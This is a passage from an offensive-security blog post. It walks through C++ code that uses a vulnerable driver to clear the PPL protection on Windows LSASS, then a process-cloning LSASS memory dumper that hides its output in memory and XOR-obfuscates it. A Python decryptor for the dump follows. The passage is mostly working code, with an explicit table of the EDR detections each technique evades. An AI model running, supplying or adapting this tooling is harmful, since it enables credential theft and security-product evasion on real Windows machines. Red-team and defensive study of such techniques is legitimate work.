+         <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+         <span class="n">BYTE</span> <span class="n">prot</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+         <span class="n">Amd_ReadMemory</span><span class="p">(</span><span class="n">currentEproc</span> <span class="o">+</span> <span class="n">Offsets</span><span class="p">.</span><span class="n">ImageFileNameOffset</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="mi">15</span><span class="p">);</span>
+         <span class="n">Amd_ReadMemory</span><span class="p">(</span><span class="n">currentEproc</span> <span class="o">+</span> <span class="n">Offsets</span><span class="p">.</span><span class="n">ProtectionOffset</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">prot</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+
+         <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[+] Found Target: "</span> <span class="o">&lt;&lt;</span> <span class="n">name</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Lastly, we output the current protection level for LSASS and clear the protection to remove the PPL protective barrier:</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] Current Protection: 0x"</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">prot</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+
+            <span class="c1">// ACTION: Clear Protection</span>
+            <span class="n">BYTE</span> <span class="n">zero</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">Amd_WriteMemory</span><span class="p">(</span><span class="n">currentEproc</span> <span class="o">+</span> <span class="n">Offsets</span><span class="p">.</span><span class="n">ProtectionOffset</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">zero</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
+                <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[!!!] SUCCESS: Protection byte cleared."</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="n">found</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">currentFlink</span> <span class="o">=</span> <span class="n">ReadMemoryDWORD64</span><span class="p">(</span><span class="n">currentEproc</span> <span class="o">+</span> <span class="n">Offsets</span><span class="p">.</span><span class="n">ActiveProcessLinksOffset</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">found</span><span class="p">)</span> <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[-] PID not found."</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+
+    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDriver</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>That my friends, is the completed code for our BYOVD PPL removal on a modern Windows 11 25h2 machine with all security features enabled that are inherent to Windows by default.</p>
+
+<p><strong>Full source code here:</strong> <a href="https://github.com/g3tsyst3m/CodefromBlog/blob/main/2026-5-29-BYOVD%20and%20Looting%20LSASS%20in%20the%20Modern%20EDR%20Era/byovd_sample2.cpp">Source Code in Full</a></p>
+
+<h2 id="code-demo-for-disabling-ppl-protection-in-lsass">Code demo for Disabling PPL protection in LSASS<a class="header-link" href="https://g3tsyst3m.com/byovd/BYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era/#code-demo-for-disabling-ppl-protection-in-lsass" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<p>Let’s see it in action!</p>
+
+<p>Notice first how LSASS is currently protected:</p>
+
+<p><img width="1759" height="37" alt="image" src="https://github.com/user-attachments/assets/96f620a2-e30c-48b2-994c-217c976c747e"></p>
+
+<p><strong>Now we run our code:</strong></p>
+
+<p><img width="645" height="174" alt="image" src="https://github.com/user-attachments/assets/1f269199-1736-4b98-93b4-7e17ba3717c5"></p>
+
+<p>Close out and go back in to System Informer:</p>
+
+<p><img width="968" height="633" alt="image" src="https://github.com/user-attachments/assets/08c30d16-4055-4999-bd13-50a926eea679"></p>
+
+<p>We’re ready to proceed with Part 2 of this post - Dumping LSASS!</p>
+
+<h1 id="process-cloning-and-in-memory-minidump-interception-using-callbacks-and-xor-encryption">Process Cloning and In-Memory Minidump Interception using Callbacks and XOR Encryption<a class="header-link" href="https://g3tsyst3m.com/byovd/BYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era/#process-cloning-and-in-memory-minidump-interception-using-callbacks-and-xor-encryption" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>
+
+<p>Alright, let’s break this tool down piece by piece. This is a memory dumper that combines a few evasion tricks to fly under the radar of most EDR solutions:</p>
+
+<ul>
+  <li>Process cloning</li>
+  <li>Threading to prevent the machine locking up during the dump (this happens to me more often that I’d like to admit!) 😸</li>
+  <li>In-memory Minidump interception using NUL file handles and Callbacks to prevent writing in the clear</li>
+  <li>XOR obfuscation applied to the final <code class="language-plaintext highlighter-rouge">.DMP</code> file</li>
+</ul>
+
+<p>All before anything ever touches disk. Let’s get into it.</p>
+
+<hr>
+
+<h2 id="headers-globals-and-the-xor-key">Headers, Globals, and the XOR Key<a class="header-link" href="https://g3tsyst3m.com/byovd/BYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era/#headers-globals-and-the-xor-key" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;winternl.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;DbgHelp.h&gt;</span><span class="cp">
+</span><span class="p">...</span>
+<span class="cp">#pragma comment(lib, "ntdll.lib")
+#pragma comment(lib, "Dbghelp.lib")
+</span>
+<span class="cp">#define PS_INHERIT_HANDLES 0x00000004
+</span><span class="k">const</span> <span class="kt">char</span> <span class="n">XOR_KEY</span> <span class="o">=</span> <span class="mh">0x55</span><span class="p">;</span>
+
+<span class="n">std</span><span class="o">::</span><span class="n">atomic</span><span class="o">&lt;</span><span class="n">DWORD</span><span class="o">&gt;</span> <span class="n">dumpSize</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="n">LPVOID</span> <span class="n">dumpBuffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Nothing too wild here on the surface, but a few things worth calling out. We’re pulling in <code class="language-plaintext highlighter-rouge">winternl.h</code> because we need access to undocumented NT internals.  Specifically, <code class="language-plaintext highlighter-rouge">NtCreateProcessEx</code>, which is the core of our cloning trick. <code class="language-plaintext highlighter-rouge">DbgHelp.h</code> gives us <code class="language-plaintext highlighter-rouge">MiniDumpWriteDump</code>, the function that does the actual memory capture.</p>
+
+<p><code class="language-plaintext highlighter-rouge">PS_INHERIT_HANDLES (0x4)</code> is the flag we’ll pass to <code class="language-plaintext highlighter-rouge">NtCreateProcessEx</code> to make the cloned process inherit handles from the parent, which is critical for the clone to function properly.</p>
+
+<p><code class="language-plaintext highlighter-rouge">XOR_KEY = 0x55</code> is our dead-simple obfuscation key.  It’s enough to mangle the MZ header and scramble the dump so signature-based detections on file writes don’t immediately fire. More on that later.</p>
+
+<p><code class="language-plaintext highlighter-rouge">dumpSize</code> is atomic because it’s shared between the callback thread (which increments it) and the main thread (which reads it).  We don’t want a race condition eating our byte count.</p>
+
+<hr>
+
+<h2 id="the-ntcreateprocessex-typedef">The NtCreateProcessEx Typedef<a class="header-link" href="https://g3tsyst3m.com/byovd/BYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era/#the-ntcreateprocessex-typedef" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="nf">NTSTATUS</span><span class="p">(</span><span class="n">NTAPI</span><span class="o">*</span> <span class="n">NtCreateProcessEx_t</span><span class="p">)(</span>
+    <span class="n">OUT</span> <span class="n">PHANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
+    <span class="n">IN</span> <span class="n">ACCESS_MASK</span> <span class="n">DesiredAccess</span><span class="p">,</span>
+    <span class="n">IN</span> <span class="n">POBJECT_ATTRIBUTES</span> <span class="n">ObjectAttributes</span> <span class="n">OPTIONAL</span><span class="p">,</span>
+    <span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ParentProcess</span><span class="p">,</span>
+    <span class="n">IN</span> <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">,</span>
+    <span class="p">...</span>
+    <span class="p">);</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">NtCreateProcessEx</code> is an an undocumented Windows Native API that lets you create a new process using an <em>existing process as the parent template</em>. Microsoft doesn’t officially expose this in the SDK, so we have to define the function pointer signature ourselves and resolve it at runtime via <code class="language-plaintext highlighter-rouge">GetProcAddress</code> from <code class="language-plaintext highlighter-rouge">ntdll.dll</code>.  Thankfully many other researchers have explored this undocumented NT API and shared their findings so we can better understand them. 😸</p>
+
+<p>This is essentially the heart of the <strong>process cloning</strong> technique. Instead of opening a handle to something sensitive like <code class="language-plaintext highlighter-rouge">lsass.exe</code> and reading its memory directly (which EDRs absolutely watch for), we clone it. The clone is a snapshot of the original process’s address space.  It’s the same memory and same handles, but it’s a new process object. Dumping the <em>clone</em> instead of the original is a classic way to sidestep handle-based detections.</p>
+
+<hr>
+
+<h2 id="getting-sedebugprivilege">Getting SeDebugPrivilege<a class="header-link" href="https://g3tsyst3m.com/byovd/BYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era/#getting-sedebugprivilege" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">EnablePrivilege</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">privilege</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">HANDLE</span> <span class="n">hToken</span><span class="p">;</span>
+    <span class="n">TOKEN_PRIVILEGES</span> <span class="n">tp</span><span class="p">;</span>
+    <span class="n">LUID</span> <span class="n">luid</span><span class="p">;</span>
+
+    <span class="n">OpenProcessToken</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="n">TOKEN_ADJUST_PRIVILEGES</span> <span class="o">|</span> <span class="n">TOKEN_QUERY</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hToken</span><span class="p">);</span>
+    <span class="n">LookupPrivilegeValue</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">privilege</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">luid</span><span class="p">);</span>
+    <span class="n">tp</span><span class="p">.</span><span class="n">Privileges</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">Attributes</span> <span class="o">=</span> <span class="n">SE_PRIVILEGE_ENABLED</span><span class="p">;</span>
+    <span class="n">AdjustTokenPrivileges</span><span class="p">(</span><span class="n">hToken</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tp</span><span class="p">,</span> <span class="p">...);</span>
+    <span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Before we can open handles to protected processes or clone them, we need <code class="language-plaintext highlighter-rouge">SeDebugPrivilege</code>. This privilege lets a process read/write the memory of any other process on the system, including protected ones. It’s typically held by admins and SYSTEM.</p>
+
+<p>The flow here is standard:</p>
+<ol>
+  <li>Open our own process token</li>
+  <li>Look up the LUID (locally unique identifier) for the privilege we want</li>
+  <li>Set it enabled and call <code class="language-plaintext highlighter-rouge">AdjustTokenPrivileges</code></li>
+</ol>
+
+<p>This is a prerequisite step. If we can’t get SeDebug, we bail early.</p>
+
+<hr>
+
+<h2 id="xor-obfuscation">XOR Obfuscation<a class="header-link" href="https://g3tsyst3m.com/byovd/BYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era/#xor-obfuscation" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">xor_buffer</span><span class="p">(</span><span class="n">LPVOID</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">size</span><span class="p">,</span> <span class="kt">char</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">BYTE</span><span class="o">*</span> <span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">DWORD</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">p</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Nothing fancy here really, just standard XOR encryption logic.  We walk every byte in the dump buffer and XOR it against <code class="language-plaintext highlighter-rouge">0x55</code>. The reason this matters: a raw minidump starts with the signature <code class="language-plaintext highlighter-rouge">MDMP</code> followed by recognizable structures. EDR products and AV engines scan file writes for these patterns. XOR-ing the buffer before it hits disk scrambles those signatures completely. The first four bytes <code class="language-plaintext highlighter-rouge">4D 44 4D 50</code> become <code class="language-plaintext highlighter-rouge">18 11 18 05</code>, which is totally unrecognizable.</p>
+
+<p>To recover the dump later for analysis in <strong>Mimikatz</strong> or <strong>pypykatz</strong>, you just <strong>XOR</strong> it again with the same key (XOR is its own inverse).</p>
+
+<hr>
+
+<h2 id="the-worker-thread">The Worker Thread<a class="header-link" href="https://g3tsyst3m.com/byovd/BYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era/#the-worker-thread" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">process_and_save_dump</span><span class="p">(</span><span class="n">LPVOID</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">size</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">outPath</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">xor_buffer</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">XOR_KEY</span><span class="p">);</span>
+
+    <span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="n">outPath</span><span class="p">,</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">CREATE_ALWAYS</span><span class="p">,</span> <span class="p">...);</span>
+    <span class="n">WriteFile</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesWritten</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hFile</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>After the dump lands in RAM, we spin up a worker thread to handle the XOR pass and disk write. This keeps the main thread clean and separates the dumping phase from the obfuscation/exfil phase. The dump lands at <code class="language-plaintext highlighter-rouge">C:\Users\Public\PID_xor.dmp</code>, whic is a world-writable path, no special permissions needed.</p>
+
+<hr>
+
+<h2 id="the-callback-routine-and-intercepting-minidump-writes">The Callback Routine and Intercepting MiniDump Writes<a class="header-link" href="https://g3tsyst3m.com/byovd/BYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era/#the-callback-routine-and-intercepting-minidump-writes" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="n">CALLBACK</span> <span class="nf">DumpCallbackRoutine</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">CallbackParam</span><span class="p">,</span> 
+    <span class="k">const</span> <span class="n">PMINIDUMP_CALLBACK_INPUT</span> <span class="n">CallbackInput</span><span class="p">,</span> 
+    <span class="n">PMINIDUMP_CALLBACK_OUTPUT</span> <span class="n">CallbackOutput</span><span class="p">)</span> <span class="p">{</span>
+
+    <span class="k">switch</span> <span class="p">(</span><span class="n">CallbackInput</span><span class="o">-&gt;</span><span class="n">CallbackType</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">case</span> <span class="n">IoStartCallback</span><span class="p">:</span>
+        <span class="n">CallbackOutput</span><span class="o">-&gt;</span><span class="n">Status</span> <span class="o">=</span> <span class="n">S_FALSE</span><span class="p">;</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="k">case</span> <span class="n">IoWriteAllCallback</span><span class="p">:</span>
+        <span class="n">source</span> <span class="o">=</span> <span class="n">CallbackInput</span><span class="o">-&gt;</span><span class="n">Io</span><span class="p">.</span><span class="n">Buffer</span><span class="p">;</span>
+        <span class="n">destination</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">dumpBuffer</span> <span class="o">+</span> <span class="n">CallbackInput</span><span class="o">-&gt;</span><span class="n">Io</span><span class="p">.</span><span class="n">Offset</span><span class="p">);</span>
+        <span class="n">RtlCopyMemory</span><span class="p">(</span><span class="n">destination</span><span class="p">,</span> <span class="n">source</span><span class="p">,</span> <span class="n">bufferSize</span><span class="p">);</span>
+        <span class="n">dumpSize</span><span class="p">.</span><span class="n">fetch_add</span><span class="p">(</span><span class="n">bufferSize</span><span class="p">);</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="k">case</span> <span class="n">IoFinishCallback</span><span class="p">:</span>
+        <span class="n">CallbackOutput</span><span class="o">-&gt;</span><span class="n">Status</span> <span class="o">=</span> <span class="n">S_OK</span><span class="p">;</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>This is one of the slicker tricks in the toolbox. <code class="language-plaintext highlighter-rouge">MiniDumpWriteDump</code> normally writes directly to a file handle you provide. But it also supports a callback interface.  Through that callback, every I/O operation gets routed through our function before it hits disk.</p>
+
+<p>Here’s what each callback type does:</p>
+
+<ul>
+  <li><strong><code class="language-plaintext highlighter-rouge">IoStartCallback</code></strong> — fires when the dump begins. We return <code class="language-plaintext highlighter-rouge">S_FALSE</code> to signal “I’ll handle the I/O myself.”</li>
+  <li><strong><code class="language-plaintext highlighter-rouge">IoWriteAllCallback</code></strong> — fires for every chunk of data being written. Instead of letting it go to disk, we <code class="language-plaintext highlighter-rouge">RtlCopyMemory</code> it into our own <code class="language-plaintext highlighter-rouge">dumpBuffer</code> at the correct offset. The <code class="language-plaintext highlighter-rouge">dumpSize</code> atomic counter tracks total bytes captured.</li>
+  <li><strong><code class="language-plaintext highlighter-rouge">IoFinishCallback</code></strong> — fires when the dump is done. We return <code class="language-plaintext highlighter-rouge">S_OK</code> to signal success.</li>
+</ul>
+
+<p>The result: the entire dump lives in <strong>RAM only</strong> until we deliberately write it. This sidesteps file-based write detections entirely during the capture phase. 😏</p>
+
+<hr>
+
+<h2 id="putting-it-all-together">Putting It All Together<a class="header-link" href="https://g3tsyst3m.com/byovd/BYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era/#putting-it-all-together" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+    <span class="n">DWORD</span> <span class="n">targetPid</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="n">EnablePrivilege</span><span class="p">(</span><span class="n">SE_DEBUG_NAME</span><span class="p">);</span>
+
+    <span class="c1">// 1. Allocate 200MB heap buffer</span>
+    <span class="n">dumpBuffer</span> <span class="o">=</span> <span class="n">HeapAlloc</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">200</span><span class="p">);</span>
+
+    <span class="c1">// 2. Clone the target process</span>
+    <span class="n">HANDLE</span> <span class="n">hTarget</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">targetPid</span><span class="p">);</span>
+    <span class="n">NtCreateProcessEx</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hClone</span><span class="p">,</span> <span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">hTarget</span><span class="p">,</span> <span class="n">PS_INHERIT_HANDLES</span><span class="p">,</span> <span class="p">...);</span>
+
+    <span class="c1">// 3. Open a handle to NUL</span>
+    <span class="n">HANDLE</span> <span class="n">hNul</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="s">"NUL"</span><span class="p">,</span> <span class="n">GENERIC_ALL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="p">...);</span>
+
+    <span class="c1">// 4. Dump via callback</span>
+    <span class="n">MiniDumpWriteDump</span><span class="p">(</span><span class="n">hClone</span><span class="p">,</span> <span class="n">targetPid</span><span class="p">,</span> <span class="n">hNul</span><span class="p">,</span> <span class="n">MiniDumpWithFullMemory</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">mci</span><span class="p">);</span>
+
+    <span class="c1">// 5. XOR + write in worker thread</span>
+    <span class="n">std</span><span class="o">::</span><span class="kr">thread</span> <span class="n">worker</span><span class="p">(</span><span class="n">process_and_save_dump</span><span class="p">,</span> <span class="n">dumpBuffer</span><span class="p">,</span> <span class="n">finalSize</span><span class="p">,</span> <span class="n">outPath</span><span class="p">);</span>
+    <span class="n">worker</span><span class="p">.</span><span class="n">join</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The main function orchestrates the whole attack chain:</p>
+
+<p><strong>Step 1 — Buffer allocation.</strong> We pre-allocate 200MB on the heap to receive the dump. This is sized generously to handle a full <code class="language-plaintext highlighter-rouge">lsass</code> dump on most systems.</p>
+
+<p><strong>Step 2 — Process cloning</strong>. We open the target PID with <strong>PROCESS_CREATE_PROCESS</strong> access, then pass that handle to <strong>NtCreateProcessEx</strong> as the parent. The kernel creates a new cloned process object that is a snapshot of the target’s address space. We then dump the clone, not the original <code class="language-plaintext highlighter-rouge">LSASS</code> process. This avoids opening a full read/write handle directly on the sensitive <code class="language-plaintext highlighter-rouge">lsass.exe</code> process (the pattern most EDRs monitor).</p>
+
+<p><strong>Step 3 — The NUL handle trick.</strong> <code class="language-plaintext highlighter-rouge">MiniDumpWriteDump</code> requires a file handle as a parameter. We pass it <code class="language-plaintext highlighter-rouge">NUL</code>, which is Windows’ equivalent of <code class="language-plaintext highlighter-rouge">/dev/null</code>. Since our callback intercepts all writes before they reach the file, nothing actually goes to NUL. But the function needs a valid handle, and NUL is the cleanest placeholder.</p>
+
+<p><strong>Step 4 — Dump triggered via callback.</strong> With <code class="language-plaintext highlighter-rouge">MiniDumpWithFullMemory</code> we capture everything: stack, heap, mapped files. The callback silently redirects every write chunk into our RAM buffer.</p>
+
+<p><strong>Step 5 — Worker thread handles the rest.</strong> Once the dump is in memory, we hand it off to the worker thread to XOR and write to disk. Main thread waits for it to finish, then cleans up all handles and frees the heap buffer.</p>
+
+<hr>
+
+<p>Final source code: <a href="https://github.com/g3tsyst3m/CodefromBlog/blob/main/2026-5-29-BYOVD%20and%20Looting%20LSASS%20in%20the%20Modern%20EDR%20Era/dump_the_goodz_7.cpp">Full Source Code</a></p>
+
+<h2 id="evasion-summary">Evasion Summary<a class="header-link" href="https://g3tsyst3m.com/byovd/BYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era/#evasion-summary" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<p>To recap, this tool chains several techniques together that each address a different detection layer:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Technique</th>
+      <th>What It Evades</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Process cloning via NtCreateProcessEx</td>
+      <td>Handle-based detections on sensitive processes</td>
+    </tr>
+    <tr>
+      <td>MiniDump callback (in-memory dump)</td>
+      <td>File-write monitoring during capture</td>
+    </tr>
+    <tr>
+      <td>XOR before disk write</td>
+      <td>Signature scanning on dump files</td>
+    </tr>
+    <tr>
+      <td>Writing to NUL device</td>
+      <td>File creation events during the dump call</td>
+    </tr>
+    <tr>
+      <td>Worker thread separation</td>
+      <td>Keeps dump/write operations isolated</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>No single one of these is a silver bullet, but layered together, they make for a very covert approach to dumping LSASS in the modern era of EDR.</p>
+
+<hr>
+
+<h2 id="code-demo">Code Demo!<a class="header-link" href="https://g3tsyst3m.com/byovd/BYOVD-and-Looting-LSASS-in-the-Modern-EDR-Era/#code-demo" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>
+
+<p><img width="1076" height="185" alt="image" src="https://github.com/user-attachments/assets/f8e61426-1448-4d06-954a-07767e8d3634"></p>
+
+<p>And the encrypted file:</p>
+
+<p><img width="1638" height="878" alt="image" src="https://github.com/user-attachments/assets/3d730761-4dcf-44bc-b52a-2eab13e94ae4"></p>
+
+<p>okay, let’s decrypt this thing!</p>
+
+<p><img width="892" height="184" alt="image" src="https://github.com/user-attachments/assets/9fa293e8-f7f6-4d91-a1e5-12a35a3b0837"></p>
+
+<p><img width="1058" height="732" alt="image" src="https://github.com/user-attachments/assets/99964278-efaa-42ab-b34a-9f86d06bfd2e"></p>
+
+<p>Want the decrypt code?  Sure, here it is.  Take it! 😸</p>
+
+<blockquote>
+  <p><strong>XOR Decrypt code</strong></p>
+</blockquote>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">sys</span>
+
+<span class="k">def</span> <span class="nf">xor_decrypt</span><span class="p">(</span><span class="n">input_path</span><span class="p">,</span> <span class="n">output_path</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="mh">0x55</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] Reading encrypted dump: </span><span class="si">{</span><span class="n">input_path</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+        <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">input_path</span><span class="p">,</span> <span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">encrypted_data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
+
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] Decrypting </span><span class="si">{</span><span class="nf">len</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">)</span><span class="si">}</span><span class="s"> bytes...</span><span class="sh">"</span><span class="p">)</span>
+        <span class="c1"># Perform XOR operation on every byte
+</span>        <span class="n">decrypted_data</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">([</span><span class="n">b</span> <span class="o">^</span> <span class="n">key</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">encrypted_data</span><span class="p">])</span>
+
